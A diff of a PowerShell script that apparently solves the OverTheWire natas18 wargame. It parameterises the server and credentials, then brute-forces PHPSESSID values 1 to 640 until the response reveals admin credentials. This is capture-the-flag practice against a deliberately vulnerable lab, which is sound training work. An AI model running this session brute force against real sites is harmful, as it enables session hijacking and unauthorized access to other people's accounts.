@@ -1,8 +1,12 @@
-$server = "natas18.natas.labs.overthewire.org"
-$url = "http://$server/index.php?debug"
-
-$username = "natas18"
-$password = "***REMOVED***"
+param (
+    [Parameter(Mandatory=$true)]
+    [string]$server,
+    [Parameter(Mandatory=$true)]
+    [string]$username,
+    [Parameter(Mandatory=$true)]
+    [string]$password
+)
+$url = $server
 
 $pair = "${username}:${password}"
 $bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
@@ -12,7 +16,10 @@ $authorization = "Basic $base64"
 $headers = @{
     "Authorization" = $authorization
     "Content-Type"  = "application/x-www-form-urlencoded"
-}
+} 
+
+$url = "http://$server/index.php?debug"
+
 
 $correctStr = 'The credentials'
 
@@ -31,7 +38,7 @@ for ($i = 1; $i -le 640; $i++) {
     if ($response.Content -like "*$correctStr*") {
         write-host $response.content `n
         write-host "[admin] => 1"
-        write-host "yooooo ur mum: phpSESSID: $i"
+        write-host "yooooo: phpSESSID: $i"
         break
     }
 
